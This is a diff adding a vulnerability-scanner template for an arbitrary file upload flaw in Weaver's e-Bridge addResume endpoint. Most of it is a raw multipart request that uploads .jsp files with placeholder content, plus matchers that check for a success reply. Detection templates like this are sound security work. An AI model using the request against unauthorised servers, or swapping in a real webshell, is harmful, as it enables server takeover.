@@ -1,0 +1,55 @@
+id: e-bridge-addresume-upload
+
+info:
+  name: E-Bridge addResume - Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。攻击者可通过任意文件上传漏洞上传文件，获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5(e-Bridge)%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3addResume%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: 泛微-云桥e-Bridge
+
+http:
+  - raw:
+      - |
+        POST /wxclient/app/recruit/resume/addResume?fileElementId=H HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        Origin: null
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: cross-site
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundaryD5Mawpg068t7pbxZ
+        Content-Disposition: form-data; name="file"; filename="{{ranstr}}.jsp"
+        Content-Type: application/octet-stream
+
+        127
+        ------WebKitFormBoundaryD5Mawpg068t7pbxZ
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: application/octet-stream
+
+        127
+        ------WebKitFormBoundaryD5Mawpg068t7pbxZ--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'status":"success'
+          - 'msg":提交成功'
